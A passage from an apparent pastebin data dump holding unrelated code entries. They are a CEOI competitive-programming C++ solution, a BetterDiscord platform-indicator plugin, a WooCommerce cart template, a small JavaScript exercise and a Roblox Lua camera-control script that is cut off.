        if (g[i].size() == 1) {
            ++originalLeaves;
            toggleToRoot(i);
        }
    }
    
    while (q--) {
        int D; cin >> D;
        vector<int> a(D);
        for (int &x : a) cin >> x;

        int totalLeaves = originalLeaves + D;
        sort(a.begin(), a.end());
        vector<int> noLongerLeaves;
        for (size_t i = 0; i < a.size(); ++i) {
            if (g[a[i]].size() == 1 && (!i || a[i] != a[i-1])) {
                --totalLeaves;
                noLongerLeaves.push_back(a[i]);
            }
        }
        if (totalLeaves & 1) {
            cout << ""-1\n"";
            continue;
        }

        for (int &x : a) toggleToRoot(x);
        for (int &x : noLongerLeaves) toggleToRoot(x);

        int even = segRoot->rangeEven(0, n, 1, n); // query number of nodes that have an even number of leaves in their subtree
        cout << (n+D-1) + even << '\n'; // cost is 1 on every odd edge, 2 on every even edge

        for (int &x : a) toggleToRoot(x);
        for (int &x : noLongerLeaves) toggleToRoot(x);
    }
    return 0;
}"
YgPB5AHF,CEOI '20 - The Potion of Great Power,erek1e,C++,Friday 7th of July 2023 04:09:45 PM CDT,"#include <bits/stdc++.h>

using namespace std;

const int INF = 1e9;
const int K = 20; // 1 in K updates will be completely recorded

int main() {
    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);
    int N, D, U, Q; cin >> N >> D >> U >> Q;

    vector<int> H(N);
    for (int &x : H) cin >> x;

    vector<vector<vector<int>>> records(N, {{}});
    vector<vector<pair<int, int>>> updates(N, {{0, -1}});
    // first is day. second is update: if negative, index of record, otherwise update

    // recordIndex is from 0 in this function
    auto buildState = [&](int a, int recordIndex, int lastUpdate) {
        int prevIndex = recordIndex*K;
        assert(updates[a][prevIndex].second < 0);
        assert(lastUpdate >= prevIndex && lastUpdate-prevIndex <= K); // equal to K when building next record

        vector<int> delta;
        for (size_t i = prevIndex+1; i <= lastUpdate; ++i) {
            int v = updates[a][i].second;
            delta.push_back(v);
        }
        sort(delta.begin(), delta.end());

        vector<pair<int, bool>> delta2;
        for (int i = 0; i < delta.size(); ++i) {
            if (i+1 < (int)delta.size() && delta[i] == delta[i+1]) ++i;
            else delta2.emplace_back(delta[i], false);
        }

        vector<int> result;
        for (int x : records[a][recordIndex]) {
            int id = lower_bound(delta2.begin(), delta2.end(), pair<int, bool>{x, false}) - delta2.begin();
            if (id < (int)delta2.size() && delta2[id].first == x) {
                assert(!delta2[id].second);
                delta2[id].second = true;
            } else result.push_back(x);
        }
        for (auto [x, removed] : delta2) {
            if (!removed) result.push_back(x);
        }
        return result;
    };

    auto upd = [&](int a, int b, int day) {
        if ((int)updates[a].size() % K == 0) {
            // store entire adjacency list of a once every k updates
            updates[a].emplace_back(day, b);
            vector<int> v = buildState(a, (int)records[a].size()-1, (int)updates[a].size()-1);
            updates[a].pop_back();
            records[a].push_back(v);

            updates[a].emplace_back(day, -(int)records[a].size());
        } else {
            // simply store update as toggle
            updates[a].emplace_back(day, b);
        }
    };

    for (int day = 1; day <= U; ++day) {
        int a, b; cin >> a >> b;
        upd(a, b, day);
        upd(b, a, day);
    }

    auto getFriends = [&](int a, int day) {
        int id = upper_bound(updates[a].begin(), updates[a].end(), pair<int, int>{day, INF}) - updates[a].begin();
        --id;
        int recordID = id / K; // at update recordID * K
        return buildState(a, recordID, id);
    };

    while (Q--) {
        int x, y, v; cin >> x >> y >> v;
        vector<int> a = getFriends(x, v), b = getFriends(y, v);
        // sort by H
        for (int &u : a) u = H[u];
        for (int &u : b) u = H[u];
        sort(a.begin(), a.end());
        sort(b.begin(), b.end());
        int minDist = INF;
        for (int i = 0, j = 0; i < (int)a.size(); ++i) { // j is smallest s.t. b[j] >= a[i]
            while (j < (int)b.size() && b[j] < a[i]) ++j;
            if (j) minDist = min(minDist, a[i] - b[j-1]);
            if (j < (int)b.size()) minDist = min(minDist, b[j] - a[i]);
        }
        cout << minDist << endl;
    }
    return 0;
}
"
jXE2gsxv,platform,magnetos,JavaScript,Friday 7th of July 2023 03:59:14 PM CDT,"/**
* @name PlatformIndicators
* @displayName PlatformIndicators
* @authorId 415849376598982656
* @invite gvA2ree
* @version 1.4.2
*/
/*@cc_on
@if (@_jscript)
     
    // Offer to self-install for clueless users that try to run this directly.
    var shell = WScript.CreateObject(""WScript.Shell"");
    var fs = new ActiveXObject(""Scripting.FileSystemObject"");
    var pathPlugins = shell.ExpandEnvironmentStrings(""%APPDATA%\BetterDiscord\plugins"");
    var pathSelf = WScript.ScriptFullName;
    // Put the user at ease by addressing them in the first person
    shell.Popup(""It looks like you""ve mistakenly tried to run me directly. \n(Don""t do that!)"", 0, ""I""m a plugin for BetterDiscord"", 0x30);
    if (fs.GetParentFolderName(pathSelf) === fs.GetAbsolutePathName(pathPlugins)) {
        shell.Popup(""I""m in the correct folder already."", 0, ""I""m already installed"", 0x40);
    } else if (!fs.FolderExists(pathPlugins)) {
        shell.Popup(""I can""t find the BetterDiscord plugins folder.\nAre you sure it""s even installed?"", 0, ""Can""t install myself"", 0x10);
    } else if (shell.Popup(""Should I copy myself to BetterDiscord""s plugins folder for you?"", 0, ""Do you need some help?"", 0x34) === 6) {
        fs.CopyFile(pathSelf, fs.BuildPath(pathPlugins, fs.GetFileName(pathSelf)), true);
        // Show the user where to put plugins in the future
        shell.Exec(""explorer "" + pathPlugins);
        shell.Popup(""I""m installed!"", 0, ""Successfully installed"", 0x40);
    }
    WScript.Quit();
@else@*/
 
module.exports = (() => {
    const config = {
        info: {
            name: ""PlatformIndicators"",
            authors: [
                {
                    name: ""Strencher"",
                    discord_id: ""415849376598982656"",
                    github_username: ""Strencher"",
                    twitter_username: ""Strencher3""
                }
            ],
            version: ""1.4.2"",
            description: ""Adds indicators for every platform that the user is using. Source code available on the repo in the 'src' folder."",
            github: ""https://github.com/Strencher/BetterDiscordStuff/blob/master/PlatformIndicators/APlatformIndicators.plugin.js"",
            github_raw: ""https://raw.githubusercontent.com/Strencher/BetterDiscordStuff/master/PlatformIndicators/APlatformIndicators.plugin.js""
        },
        changelog: [
            {
                title: ""v1.4.2"",
                type: ""fixed"",
                items: [
                    ""Fixed indicators not showing in user popout for new usernames."",
                ]
            },
        ],
        defaultConfig: [
            {
                type: ""switch"",
                name: ""Show in MemberList"",
                note: ""Shows the platform indicators in the memberlist"",
                id: ""showInMemberList"",
                value: true
            },
            {
                type: ""switch"",
                name: ""Show next to username"",
                note: ""Shows the platform indicators next the username in messages."",
                id: ""showInChat"",
                value: true
            },
            {
                type: ""switch"",
                name: ""Show in DMs List"",
                note: ""Shows the platform indicators in the dm list."",
                id: ""showInDmsList"",
                value: true
            },
            {
                type: ""switch"",
                name: ""Show next to discord tags"",
                note: ""Shows the platform indicators right next to the discord tag."",
                id: ""showInTags"",
                value: true
            },
            {
                type: ""switch"",
                name: ""Ignore Bots"",
                note: ""Ignores the status of bots which is always web anyways."",
                id: ""ignoreBots"",
                value: true
            },
            {
                type: ""category"",
                name: ""icons"",
                id: ""icons"",
                settings: [
                    {
                        type: ""switch"",
                        name: ""Web Icon"",
                        note: ""Show the Web icon."",
                        id: ""web"",
                        value: true
                    },
                    {
                        type: ""switch"",
                        name: ""Desktop Icon"",
                        note: ""Show the Desktop icon."",
                        id: ""desktop"",
                        value: true
                    },
                    {
                        type: ""switch"",
                        name: ""Mobile Icon"",
                        note: ""Show the Mobile icon."",
                        id: ""mobile"",
                        value: true
                    },
                    {
                        type: ""switch"",
                        name: ""Embedded Icon"",
                        note: ""Show the Embedded icon."",
                        id: ""embedded"",
                        value: true
                    }
                ]
            }
        ]
    };
    
    return !global.ZeresPluginLibrary ? class {
        constructor() {
            this._config = config;
        }
        getName() {return config.info.name;}
        getAuthor() {return config.info.authors.map(a => a.name).join("", "");}
        getDescription() {return config.info.description;}
        getVersion() {return config.info.version;}
        load() {
            BdApi.showConfirmationModal(""Library plugin is needed"", [`The library plugin needed for ${config.info.name} is missing. Please click Download Now to install it.`], {
                confirmText: ""Download"",
                cancelText: ""Cancel"",
                onConfirm: () => {
                    require(""request"").get(""https://rauenzi.github.io/BDPluginLibrary/release/0PluginLibrary.plugin.js"", async (error, response, body) => {
                        if (error)
                            return require(""electron"").shell.openExternal(""https://betterdiscord.net/ghdl?url=https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js"");
                        await new Promise(r => require(""fs"").writeFile(require(""path"").join(BdApi.Plugins.folder, ""0PluginLibrary.plugin.js""), body, r));
                    });
                }
            });
        }
        start() {}
        stop() {}
    } : (([Plugin, Api]) => {
        const plugin = (Plugin, Api) => {
            const {DiscordClasses, DOMTools, Utilities, WebpackModules, PluginUtilities, ReactTools, DiscordModules: {LocaleManager: {Messages}, UserStatusStore, UserStore}} = Api;
            const Dispatcher = WebpackModules.getByProps(""dispatch"", ""register"");
            const LocalActivityStore = WebpackModules.getByProps(""getCustomStatusActivity"");
            const Flux = Object.assign({}, WebpackModules.getByProps(""Store"", ""connectStores""), WebpackModules.getByProps(""useStateFromStores""));
            const SessionsStore = WebpackModules.getByProps(""getSessions"", ""_dispatchToken"");
            const friendsRowClasses = WebpackModules.getByProps(""hovered"", ""discriminator"");
 
            const {DOM, Webpack, Webpack: {Filters}} = BdApi;
            const [ChatHeader, NameTag, MemberListItem, DirectMessage, NewUserName, {LayerClassName = """"} = {}] = Webpack.getBulk.apply(null, [
                Filters.byProps(""replyAvatar"", ""sizeEmoji""),
                Filters.byProps(""bot"", ""nameTag""),
                Filters.byProps(""wrappedName"", ""nameAndDecorators""),
                Filters.combine(Filters.byProps(""wrappedName"", ""nameAndDecorators""), m => !m.container),
                Filters.byProps(""discrimBase"", ""userTagUsernameBase""),
                Filters.byProps(""LayerClassName"")
            ].map(fn => ({filter: fn})));

            class StringUtils {
                static upperFirst(string) {return string.charAt(0).toUpperCase() + string.slice(1);}
                static getStatusText(key, status) {
                    return this.upperFirst(key) + "": "" + Messages[`STATUS_${(status == ""mobile"" ? ""mobile_online"" : status).toUpperCase()}`];
                }
            }

            const Settings = new class Settings extends Flux.Store {
                constructor() {super(Dispatcher, {});}
                _settings = PluginUtilities.loadSettings(config.info.name, {});
 
                get(key, def) {
                    return this._settings[key] ?? def;
                }
 
                set(key, value) {
                    this._settings[key] = value;
                    this.emitChange();
                }
            };

            const StoreWatcher = {
                _stores: [Settings, UserStatusStore, UserStore, SessionsStore],
                _listeners: new Set,
                onChange(callback) {
                    this._listeners.add(callback);
                },
                offChange(callback) {
                    this._listeners.add(callback);
                },
                _alertListeners() {
                    StoreWatcher._listeners.forEach(l => l());
                },
                _init() {
                    this._stores.forEach(store => store.addChangeListener(this._alertListeners));
                },
                _stop() {
                    this._stores.forEach(store => store.addChangeListener(this._alertListeners));
                }
            };

            const StatusColors = new Proxy({
                dnd: ""#ED4245"",
                idle: ""#FAA81A"",
                online: ""#3BA55D"",
                streaming: ""#593695"",
                offline: ""#747F8D""
            }, {
                get(target, key) {
                    return target[key] ?? target.offline;
                }
            });

            const isStreaming = () => LocalActivityStore.getActivities().some(e => e.type === 1);

            const getReactProps = (el, filter = _ => _) => {
                const instance = ReactTools.getReactInstance(el);

                for (let current = instance.return, i = 0; i > 10000 || current !== null; current = current?.return, i++) {
                    if (current?.pendingProps && filter(current.pendingProps)) return current.pendingProps;
                }

                return null;
            };

            // Taken from SolidJS' template function.
            function template(html, check, isSVG) {
                const t = document.createElement(""template"");
                t.innerHTML = html;
                let node = t.content.firstChild;
                if (isSVG)
                  node = node.firstChild;
                return node;
              }

            const createElement = (type, props, ...children) => {
                if (typeof type === ""function"") return type({...props, children: [].concat()})

                const node = document.createElement(type);

                for (const key of Object.keys(props)) {
                    if (key.indexOf(""on"") === 0) node.addEventListener(key.slice(2).toLowerCase(), props[key]);
                    else if (key === ""children"") {
                        node.append(...(Array.isArray(props[key]) ? props[key] : [].concat(props[key])));
                    } else {
                        node.setAttribute(key === ""className"" ? ""class"" : key, props[key]);
                    }
                }

                if (children.length) node.append(...children);

                return node;
            };

            class Tooltip {
                containerClassName = Utilities.className(""PI-tooltip"", ...[""tooltip"", ""tooltipTop"", ""tooltipPrimary""].map(c => DiscordClasses.Tooltips?.[c]?.value));
                pointerClassName = DiscordClasses.Tooltips?.tooltipPointer?.value;
                contentClassName = DiscordClasses.Tooltips?.tooltipContent?.value;

                constructor(target, {text, spacing}) {
                    this.target = target;
                    this.ref = null;
                    this.text = text;
                    this.spacing = spacing;
                    this.tooltip = createElement(""div"", {
                        className: this.containerClassName,
                        style: ""visibility: hidden;"",
                        children: [
                            createElement(""div"", {className: this.pointerClassName, style: ""left: calc(50% + 0px)""}),
                            createElement(""div"", {className: this.contentClassName}, text)
                        ]
                    });

                    target.addEventListener(""mouseenter"", () => {
                        this.show();    
                    });

                    target.addEventListener(""mouseleave"", () => {
                        this.hide();
                    });

                    this.tooltip._unmount = DOM.onRemoved(target, () => this.hide());
                }

                get container() {return document.querySelector(`.${LayerClassName} ~ .${LayerClassName}`);}

                checkOffset(x, y) {
                    if (y < 0) {
                        y = 0;
                    } else if (y > window.innerHeight) {
                        y = window.innerHeight;
                    }
            
                    if (x > window.innerWidth) {
                        x = window.innerWidth;
                    } else if (x < 0) {
                        x = 0;
                    }
            
                    return {x, y};
                }

                show() {
                    const tooltip = this.ref = this.tooltip.cloneNode(true);
                    this.container.appendChild(tooltip);

                    const targetRect = this.target.getBoundingClientRect();
                    const tooltipRect = tooltip.getBoundingClientRect();

                    let top = (targetRect.y - tooltipRect.height) - this.spacing;
                    let left = targetRect.x + (targetRect.width / 2) - (tooltipRect.width / 2);    

                    const position = this.checkOffset(left, top);

                    tooltip.style = `top: ${position.y}px; left: ${position.x}px;`;
                }

                hide() {
                    this.ref?.remove();
                }
            }

            class StatusIndicators {
                constructor(target, userId, type) {
                    this.userId = userId;
                    this.type = type;
                    this.ref = null;
                    this.target = target;
                    this._destroyed = false;

                    target._patched = true;

                    this.container = createElement(""div"", {
                        ""data-id"": userId,
                        className: Utilities.className(""PI-indicatorContainer"", ""PI-type_"" + type),
                    });

                    this._stopObserver = DOM.onRemoved(target, () => this.unmount());

                    StoreWatcher.onChange(this.handleChange);
                }

                unmount() {
                    this.ref?.remove();
                    this._stopObserver?.();
                    this._destroyed = true;
                    StoreWatcher.offChange(this.handleChange);
                    this.target._patched = false;
                }

                mount() {
                    if (this._destroyed) return false;

                    const res = this.render();
                    if (!res) this.ref?.remove();
                    else {
                        if (this.ref) {
                            this.ref.replaceWith(res);
                        } else {
                            this.target.appendChild(res);
                        }
                        
                        this.ref = res;
                    }
                }

                handleChange = () => {
                    if (this._destroyed) return false;

                    if (this.state && _.isEqual(this.state, this.getState())) return;

                    this.mount();
                }

                getState() {
                    const user = UserStore.getUser(this.userId);
                    return {
                        iconStates: Settings.get(""icons"", {}),
                        shouldShow: (() => {
                            const shownInArea = Settings.get(""showIn"" + this.type, true);
                            const isBot = Settings.get(""ignoreBots"", true) && (user?.bot ?? false);
        
                            return shownInArea && !isBot;
                        })(),
                        clients: (() => {
                            if (user?.id === UserStore.getCurrentUser()?.id) return SessionsStore.getSession() ? {
                                [SessionsStore.getSession().clientInfo.client]: isStreaming() ? ""streaming"" : SessionsStore.getSession().status
                            } : {};
         
                            return UserStatusStore.getState().clientStatuses[user?.id] ?? {};
                        })(),
                        user
                    };
                }

                render() {
                    const container = this.container.cloneNode(true);
                    const state = this.state = this.getState();

                    if (!Object.keys(state.clients).length || !state.shouldShow) return null;

                    container._unmount = this.unmount.bind(this);

                    container.append(...Object.entries(state.clients)
                        .filter(([key]) => (state.iconStates[key] ?? true) && Icons[key] != null)
                        .map(([key, status]) => {
                            const Icon = Icons[key];
                            return Icon({
                                text: StringUtils.getStatusText(key, status),
                                style: `color: ${StatusColors[status]};`,
                                width: 18,
                                height: 18,
                                ""data-status"": status
                            });
                        })
                    );

                    return container;
                }
            }

            const createIcon = ((Icon, defaultProps) => props => {
                const element = Icon.cloneNode(true);

                if (props.text) {
                    new Tooltip(element, {
                        text: props.text,
                        spacing: 8
                    });
                }

                for (const prop in Object.assign({}, defaultProps, props)) {
                    if (prop === ""text"") continue; 
                    element.setAttribute(prop, props[prop]);
                }

                return element;
            });

            const Icons = {
                mobile: createIcon(
                    template(`<svg class=""PI-icon_mobile"" width=""24"" height=""24"" transform=""scale(0.9)"" viewBox=""0 -2.5 32 44""><path fill=""currentColor"" d=""M 2.882812 0.246094 C 1.941406 0.550781 0.519531 2.007812 0.230469 2.953125 C 0.0585938 3.542969 0 7.234375 0 17.652344 L 0 31.554688 L 0.5 32.558594 C 1.117188 33.769531 2.152344 34.5625 3.519531 34.847656 C 4.210938 35 7.078125 35.058594 12.597656 35 C 20.441406 34.941406 20.691406 34.925781 21.441406 34.527344 C 22.347656 34.054688 23.078125 33.3125 23.578125 32.386719 C 23.921875 31.761719 23.941406 30.964844 24 18.085938 C 24.039062 8.503906 24 4.167969 23.847656 3.464844 C 23.558594 2.121094 22.75 1.097656 21.519531 0.492188 L 20.5 0 L 12.039062 0.0195312 C 6.402344 0.0390625 3.328125 0.113281 2.882812 0.246094 Z M 20.382812 14.582031 L 20.382812 22.917969 L 3.652344 22.917969 L 3.652344 6.25 L 20.382812 6.25 Z M 13.789062 27.539062 C 14.5 28.296875 14.597656 29.035156 14.132812 29.925781 C 13.308594 31.496094 10.671875 31.421875 9.902344 29.8125 C 9.539062 29.054688 9.539062 28.730469 9.902344 28.011719 C 10.691406 26.535156 12.632812 26.308594 13.789062 27.539062 Z M 13.789062 27.539062 ""></path></svg>`)
                ),
                web: createIcon(
                    template(`<svg class=""PI-icon_web"" width=""24"" height=""24"" viewBox=""0 -2.5 28 28""><path fill=""currentColor"" d=""M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM11 19.93C7.05 19.44 4 16.08 4 12C4 11.38 4.08 10.79 4.21 10.21L9 15V16C9 17.1 9.9 18 11 18V19.93ZM17.9 17.39C17.64 16.58 16.9 16 16 16H15V13C15 12.45 14.55 12 14 12H8V10H10C10.55 10 11 9.55 11 9V7H13C14.1 7 15 6.1 15 5V4.59C17.93 5.78 20 8.65 20 12C20 14.08 19.2 15.97 17.9 17.39Z""></path></svg>`)
                ),
                desktop: createIcon(
                    template(`<svg class=""PI-icon_desktop"" width=""24"" height=""24"" viewBox=""0 -2.5 28 28""><path fill=""currentColor"" d=""M4 2.5C2.897 2.5 2 3.397 2 4.5V15.5C2 16.604 2.897 17.5 4 17.5H11V19.5H7V21.5H17V19.5H13V17.5H20C21.103 17.5 22 16.604 22 15.5V4.5C22 3.397 21.103 2.5 20 2.5H4ZM20 4.5V13.5H4V4.5H20Z""></path></svg>`)
                ),
                embedded: createIcon(
                    template(`<svg class=""PI-icon_embedded"" width=""24"" height=""24"" viewBox=""0 -2.5 28 28""><path fill=""currentColor"" d=""M5.79335761,5 L18.2066424,5 C19.7805584,5 21.0868816,6.21634264 21.1990185,7.78625885 L21.8575059,17.0050826 C21.9307825,18.0309548 21.1585512,18.9219909 20.132679,18.9952675 C20.088523,18.9984215 20.0442685,19 20,19 C18.8245863,19 17.8000084,18.2000338 17.5149287,17.059715 L17,15 L7,15 L6.48507125,17.059715 C6.19999155,18.2000338 5.1754137,19 4,19 C2.97151413,19 2.13776159,18.1662475 2.13776159,17.1377616 C2.13776159,17.0934931 2.1393401,17.0492386 2.1424941,17.0050826 L2.80098151,7.78625885 C2.91311838,6.21634264 4.21944161,5 5.79335761,5 Z M14.5,10 C15.3284271,10 16,9.32842712 16,8.5 C16,7.67157288 15.3284271,7 14.5,7 C13.6715729,7 13,7.67157288 13,8.5 C13,9.32842712 13.6715729,10 14.5,10 Z M18.5,13 C19.3284271,13 20,12.3284271 20,11.5 C20,10.6715729 19.3284271,10 18.5,10 C17.6715729,10 17,10.6715729 17,11.5 C17,12.3284271 17.6715729,13 18.5,13 Z M6,9 L4,9 L4,11 L6,11 L6,13 L8,13 L8,11 L10,11 L10,9 L8,9 L8,7 L6,7 L6,9 Z""></path></svg>`)
                )
            };

            const ElementInjections = {
                [ChatHeader?.headerText ?? ""unknown""]: elements => {
                    for (const el of elements) {
                        if (el.getElementsByClassName(""PI-indicatorContainer"").length || el._patched) continue;

                        const user = getReactProps(el.parentElement, e => e?.message)?.message?.author;

                        if (user) {
                            new StatusIndicators(el, user.id, ""Chat"").mount();
                        }
                    }
                },
                ...Object.fromEntries([NameTag?.nameTag, NewUserName?.userTagWithNickname]
                    .filter(Boolean)
                    .map(className => [
                        className,
                        elements => {
                            for (const el of elements) {
                                if (el.getElementsByClassName(""PI-indicatorContainer"").length || el._patched) continue;
        
                                const user = getReactProps(el, e => e?.user)?.user;
                                if (user) {
                                    new StatusIndicators(el, user.id, ""Tags"").mount();
                                }
                            }
                        }
                    ])
                ),
                ...Object.fromEntries([MemberListItem?.nameAndDecorators, DirectMessage?.nameAndDecorators]
                    .filter(Boolean)
                    .map(className => [
                        className,
                        elements => {
                            for (const el of elements) {
                                if (el.getElementsByClassName(""PI-indicatorContainer"").length || el._patched) continue;
                                
                                const user = getReactProps(el, e => e?.user)?.user;

                                if (user) {
                                    new StatusIndicators(el, user.id, ""MemberList"").mount();
                                }
                            }
                        }
                    ])
                )
            };
 
            return class PlatformIndicators extends Plugin {
                getSettingsPanel() {
                    const panel = this.buildSettingsPanel();
 
                    // Very dirty
                    panel.addListener(() => {
                        Settings._settings = {...this.settings};
                        Settings.emitChange();
                    });
 
                    return panel.getElement();
                }
 
                css = /*css*/`
                    .PI-tooltip {
                        position: fixed;
                    }

                    .PI-indicatorContainer {
                        display: inline-flex;
                        vertical-align: bottom;
                        margin-bottom: 2px;
                        margin-left: 5px;
                    }
 
                    .PI-indicatorContainer svg {
                        margin-left: -2px;
                    }
 
                    .PI-indicatorContainer div:first-child svg {
                        margin-left: 2px;
                    }
 
                    .PI-container {
                        display: flex;
                    }

                    .PI-icon_mobile {
                        position: relative;
                        top: 1px;
                    }

                    .PI-indicatorContainer.PI-type_Chat {
                        margin-right: -6px;
                        vertical-align: top;
                    }

                    .${friendsRowClasses.userInfo} .PI-indicatorContainer > div {display: inline-flex;}
 
                    .${friendsRowClasses.userInfo} .${friendsRowClasses.discriminator} {
                        display: none;
                        visibility: visible;
                    }
 
                    .${friendsRowClasses.hovered} .${friendsRowClasses.discriminator} {display: block;}
                `;
 
                onStart() {
                    PluginUtilities.addStyle(config.info.name, this.css);
                    StoreWatcher._init();

                    for (const className in ElementInjections) {
                        const elements = Array.from(document.body.getElementsByClassName(className));

                        if (elements.length) {
                            ElementInjections[className](elements);
                        }
                    }
                }

                observer({addedNodes}) {
                    for (const added of addedNodes) {
                        if (added.nodeType === Node.TEXT_NODE) continue;

                        for (const className in ElementInjections) {
                            const elements = Array.from(added.getElementsByClassName(className));

                            if (elements.length) {
                                ElementInjections[className](elements);
                            }
                        }
                    }
                }

                onStop() {
                    StoreWatcher._stop();
                    StoreWatcher._listeners.clear();
                    PluginUtilities.removeStyle(config.info.name);
                    document.querySelectorAll("".PI-indicatorContainer"").forEach(el => el._unmount?.());
                    document.querySelectorAll("".PI-tooltip"").forEach(n => (n?._unmount?.(), n.remove()));
                }
            };
        };
        return plugin(Plugin, Api);
        //@ts-ignore
    })(global.ZeresPluginLibrary.buildPlugin(config));
})();
/*@end@*/
"
PxX0JH1w,./wp-content/themes/h-code/woocommerce/cart/cart-empty.php,danrancan,Bash,Friday 7th of July 2023 03:55:17 PM CDT,"<?php
/**
 * Empty cart page
 *
 * @package H-Code
 * @version 7.0.1
 */

defined( 'ABSPATH' ) || exit;

?>
<section>
	<div class=""container"">
		<div class=""row"">
			<?php wc_print_notices(); ?>
			<div class=""col-md-12 text-center"">
				<?php do_action( 'woocommerce_cart_is_empty' ); ?>

				<?php if ( wc_get_page_id( 'shop' ) > 0 ) : ?>
					<p class=""return-to-shop"">
						<a class=""button wc-backward highlight-button-dark btn-medium button btn<?php echo esc_attr( wc_wp_theme_get_element_class_name( 'button' ) ? ' ' . wc_wp_theme_get_element_class_name( 'button' ) : '' ); ?>"" href=""<?php echo esc_url( apply_filters( 'woocommerce_return_to_shop_redirect', wc_get_page_permalink( 'shop' ) ) ); ?>"">
							<?php
								/**
								 * Filter ""Return To Shop"" text.
								 *
								 * @since 4.6.0
								 * @param string $default_text Default text.
								 */
								echo esc_html( apply_filters( 'woocommerce_return_to_shop_text', __( 'Return to shop', 'H-Code' ) ) );
							?>
						</a>
					</p>
				<?php endif; ?>
			</div>
		</div>
	</div>
</section>"
wr7zq4H4,Untitled,veritas2022,JavaScript,Friday 7th of July 2023 03:06:44 PM CDT,"function createAssemblyLine() {
    return {
hasClima(myCar) {
    myCar.temp = 21;
    myCar.tempSettings = 21;
    myCar.adjustTemp = () => {
       myCar.temp < myCar.tempSettings ? myCar.temp++ : myCar.temp--
  };
},
hasAudio(myCar){
    myCar.currentTrack = null;
    myCar.nowPlaying = () => {
        if(myCar.currentTrack != null && myCar.currentTrack != undefined){
        console.log(`Now playing '${myCar.currentTrack.name}' by ${myCar.currentTrack.artist}`)
    }
}
},
hasParktronic(myCar){
        myCar.checkDistance = (distance) => {
if(distance < 0.1){
    console.log(""Beep! Beep! Beep!"");
}else if(distance >= 0.1 && distance < 0.25){
    console.log(""Beep! Beep!"");
}else if(distance>= 0.25 && distance < 0.5){
    console.log(""Beep!"");
}else{
    console.log('')
}
}
}
}};
const assemblyLine = createAssemblyLine();

const myCar = {
make: 'Toyota',
model: 'Avensis'
};

assemblyLine.hasClima(myCar);
console.log(myCar.temp);
myCar.tempSettings = 18;
myCar.adjustTemp();
console.log(myCar.temp);
console.log(myCar.tempSettings);
assemblyLine.hasAudio(myCar);

myCar.currentTrack = {
    name: null,
    artist: undefined
    // name: 'Never Gonna Give You Up',
    // artist: 'Rick Astley'
};

myCar.nowPlaying();
assemblyLine.hasParktronic(myCar);

myCar.checkDistance(0.4);

myCar.checkDistance(0.001);

console.log(myCar);"
rFB6fDWd,Camera Movement Script (FULL),P_YStudio,Lua,Friday 7th of July 2023 03:05:08 PM CDT,"game.Players.PlayerAdded:Connect(function(Player)
	
	local ValuesFolder = Instance.new(""Folder"", Player)
	ValuesFolder.Name = ""Values""
	
	local InteractingObject = Instance.new(""ObjectValue"", ValuesFolder)
	InteractingObject.Name = ""InteractingObject""
	
	local InteractingObjectType = Instance.new(""StringValue"", ValuesFolder)
	InteractingObjectType.Name = ""InteractingObjectType""
	
	local IsInteracting = Instance.new(""BoolValue"", ValuesFolder)
	IsInteracting.Name = ""IsInteracting""
	
	local KeyboardInput = Instance.new(""StringValue"", ValuesFolder)
	KeyboardInput.Name = ""KeyboardInput""
	
	local RLRotation = 0
	local UDRotation = 0
	
	local CameraCFrame = Instance.new(""CFrameValue"", ValuesFolder)
	CameraCFrame.Name = ""CameraCFrame""
	
	while wait(.05) do
		
		if IsInteracting.Value == true then
			
			
			if KeyboardInput.Value == tostring(Enum.KeyCode.C) then

				IsInteracting.Value = false
				Player.Character.HumanoidRootPart.Anchored = false
				InteractingObject.Value.ProximityPromptInstance.Value.Enabled = true
				Player.PlayerGui.InteractionGui.Camera.Visible = false
				
			end
			
			if InteractingObjectType.Value == ""Camera"" then
				
				if KeyboardInput.Value == tostring(Enum.KeyCode.E) then
					
					if math.max(-InteractingObject.Value.Configuration.RLRotationMax.Value, RLRotation) ~= -InteractingObject.Value.Configuration.RLRotationMax.Value then
						
						if InteractingObject.Value.Configuration.RLRotationNegative.Value == false then
							if InteractingObject.Value.Configuration.RLRotationAxis.Value == ""X"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0,0))
							elseif InteractingObject.Value.Configuration.RLRotationAxis.Value == ""Y"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0))
							elseif InteractingObject.Value.Configuration.RLRotationAxis.Value == ""Z"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,0,math.rad(-((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3))))
							end
						elseif InteractingObject.Value.Configuration.RLRotationNegative.Value == true then
							if InteractingObject.Value.Configuration.RLRotationAxis.Value == ""X"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0,0))
							elseif InteractingObject.Value.Configuration.RLRotationAxis.Value == ""Y"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0))
							elseif InteractingObject.Value.Configuration.RLRotationAxis.Value == ""Z"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(0,0,math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3))))
							end
						end	
						RLRotation -= ((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)
						
					end	
						
				elseif KeyboardInput.Value == tostring(Enum.KeyCode.Q) then
					
					if math.min(InteractingObject.Value.Configuration.RLRotationMax.Value, RLRotation) ~= InteractingObject.Value.Configuration.RLRotationMax.Value then
						
						if InteractingObject.Value.Configuration.RLRotationNegative.Value == false then
							if InteractingObject.Value.Configuration.RLRotationAxis.Value == ""X"" then
								InteractingObject.Value:PivotTo(InteractingObject.Value:GetPivot() * CFrame.Angles(math.rad(((math.max(1,InteractingObject.Value.FieldOfView.Value) / 70)*3)),0,0))
							elseif InteractingObject.Value.Configuration.RLRotationAxis.Value == ""Y"" then
